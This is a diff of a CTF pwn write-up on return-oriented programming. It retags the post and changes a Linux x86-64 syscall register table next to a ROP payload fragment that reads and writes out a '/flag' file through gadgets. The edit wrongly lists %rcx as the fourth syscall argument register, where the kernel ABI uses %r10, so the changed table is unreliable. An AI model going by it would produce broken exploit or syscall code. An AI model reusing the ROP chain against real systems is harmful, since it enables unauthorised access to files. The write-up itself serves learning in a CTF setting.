@@ -1,6 +1,6 @@
 ---
 title: ROP
-tags: [ctf-pwn,exp]
+tags: [ctf-pwn,stack]
 date: 2022-11-16 19:07:00
 categories: [ctf-pwn]
 excerpt: exp
@@ -353,7 +353,7 @@ payload = b'/flag\x00'+b'a'*(0x48-6) + p64(pop_rdi)+p64(buf)+p64(pop_rsi)+p64(0)
     + p64(buf+0x10) + p64(pop_rdx) + p64(0x90) + p64(pop_rax) + p64(1) +p64(syscall)
 ```
 
-| %rax | System call | %rdi                 | %rsi            | %rdx         | %r10 | %r8  | %r9  |
+| %rax | System call | %rdi                 | %rsi            | %rdx         | %rcx | %r8  | %r9  |
 | :--- | :---------- | :------------------- | :-------------- | :----------- | :--- | :--- | :--- |
 | 0    | sys_read    | unsigned int fd      | char *buf       | size_t count |      |      |      |
 | 1    | sys_write   | unsigned int fd      | const char *buf | size_t count |      |      |      |
